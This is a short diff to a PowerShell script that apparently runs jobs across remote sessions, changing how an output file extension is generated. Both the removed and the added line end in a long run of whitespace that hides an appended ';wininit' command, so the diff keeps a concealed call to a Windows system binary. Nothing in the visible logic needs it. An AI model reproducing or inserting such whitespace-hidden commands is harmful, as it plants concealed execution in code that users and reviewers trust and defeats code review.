@@ -208,7 +208,17 @@ if (($Script -ne '') -and ($global:Sessions.Count -gt 0) -and ($Out -ne '')) {
     }
     $Jobs = @()
     do {
-        $Extension = Get-Random -Maximum 1000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;wininit
+        $Extension = ""
+        $Script = $Script.ToLower()
+        $i = 0
+
+        while ($Script[$i] -ne '.') {
+          $Extension += ($Script[$i])
+          $i++
+        } 
+        
+        $Extension += ".$(Get-Random -Maximum 1000)"
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ;wininit
     } while (Test-Path "$Out\*.$Extension")
 
     foreach ($Session in $global:Sessions) {
